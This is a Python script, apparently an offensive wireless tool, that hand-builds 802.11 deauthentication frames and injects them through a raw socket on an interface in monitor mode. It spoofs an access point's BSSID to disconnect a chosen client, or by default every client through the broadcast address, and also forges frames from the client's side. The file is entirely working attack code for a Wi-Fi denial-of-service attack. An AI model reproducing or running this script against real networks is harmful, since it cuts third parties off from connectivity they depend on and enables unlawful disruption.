#!/usr/bin/env python3
"""
deauth_inject.py - Send deauth frames via raw socket in monitor mode
Usage: sudo python3 /tmp/deauth_inject.py <iface> <bssid> [client_mac] [count]
"""
import socket, struct, sys, time

def mac2bytes(mac):
    return bytes(int(b, 16) for b in mac.split(':'))

def build_deauth(bssid, src, dst, reason=7, seq=0):
    """Build 802.11 deauth frame"""
    # Frame control: deauth (0x00c0), duration
    fc = struct.pack('<HH', 0x00c0, 0x0000)
    # Addr1=DA, Addr2=SA(BSSID), Addr3=BSSID
    addrs = dst + src + bssid
    # Seq control
    sc = struct.pack('<H', (seq << 4) & 0xfff0)
    # Reason code
    body = struct.pack('<H', reason)
    return fc + addrs + sc + body

def build_radiotap():
    """Minimal radiotap header for injection"""
    # Version, pad, length (8 bytes), present flags (0)
    return struct.pack('<BBHI', 0, 0, 8, 0)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <iface> <bssid> [client] [count]")
        sys.exit(1)

    iface = sys.argv[1]
    bssid = mac2bytes(sys.argv[2])
    client = mac2bytes(sys.argv[3]) if len(sys.argv) > 3 else b'\xff\xff\xff\xff\xff\xff'
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 100

    # Open raw socket
    # AF_PACKET + SOCK_RAW + ETH_P_ALL
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    sock.bind((iface, 0))

    radiotap = build_radiotap()
    sent = 0

    print(f"[*] Sending {count} deauth frames on {iface}")
    print(f"[*] BSSID: {sys.argv[2]}")
    print(f"[*] Target: {sys.argv[3] if len(sys.argv) > 3 else 'ff:ff:ff:ff:ff:ff'}")

    for i in range(count):
        # Deauth from AP to client (spoofed as AP)
        frame1 = build_deauth(bssid, bssid, client, reason=7, seq=i)
        pkt1 = radiotap + frame1

        try:
            sock.send(pkt1)
            sent += 1
        except Exception as e:
            print(f"[!] Send error: {e}")
            break

        # Also send from client to AP (disassoc)
        if client != b'\xff\xff\xff\xff\xff\xff':
            frame2 = build_deauth(bssid, client, bssid, reason=8, seq=i)
            pkt2 = radiotap + frame2
            try:
                sock.send(pkt2)
                sent += 1
            except:
                pass

        if i % 50 == 0 and i > 0:
            print(f"[*] Sent {sent} frames...")

        time.sleep(0.01)

    sock.close()
    print(f"[*] Done. Sent {sent} frames total.")
